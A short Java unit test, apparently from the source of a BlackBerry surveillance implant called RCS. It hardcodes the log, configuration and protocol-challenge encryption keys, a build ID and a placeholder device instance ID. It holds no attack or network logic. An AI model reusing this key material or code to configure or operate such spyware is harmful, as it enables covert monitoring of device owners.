package com.ht.tests.unit;

import com.ht.rcs.blackberry.config.Keys;
import com.ht.tests.TestUnit;
import com.ht.tests.Tests;

public class UT_Self extends TestUnit {

	// RCS 323
	byte[] LogKey = new byte[] { (byte) 0x2b, (byte) 0xb8, (byte) 0x0b,
			(byte) 0xc9, (byte) 0x61, (byte) 0x0a, (byte) 0x0a, (byte) 0x7b,
			(byte) 0x6c, (byte) 0x9c, (byte) 0x10, (byte) 0x06, (byte) 0x85,
			(byte) 0x3d, (byte) 0x80, (byte) 0x72 };
	byte[] ConfKey = new byte[] { (byte) 0xdc, (byte) 0xaa, (byte) 0x14,
			(byte) 0xa8, (byte) 0xdd, (byte) 0xe6, (byte) 0x94, (byte) 0x69,
			(byte) 0x38, (byte) 0x25, (byte) 0x88, (byte) 0x45, (byte) 0x32,
			(byte) 0xb2, (byte) 0x4a, (byte) 0x1a };
	byte[] ProtoKey = new byte[] { (byte) 0xb0, (byte) 0xf4, (byte) 0x45,
			(byte) 0x16, (byte) 0xd1, (byte) 0x30, (byte) 0xd0, (byte) 0xa5,
			(byte) 0x51, (byte) 0x30, (byte) 0xdb, (byte) 0x9b, (byte) 0xac,
			(byte) 0x6f, (byte) 0xd5, (byte) 0xfb };
	
	public UT_Self(String name, Tests tests) {
		super(name, tests);
	}

	public boolean run() {
		Keys.byteChallengeKey = ProtoKey;
		Keys.byteAesKey = LogKey;
		Keys.byteConfKey = ConfKey;
		
		Keys.buildID = "RCS_0000000323";
		Keys.instanceID = "1234567890123456"; // univoco per device e per
		
		debug.info("run " + name);
		return true;
	}
}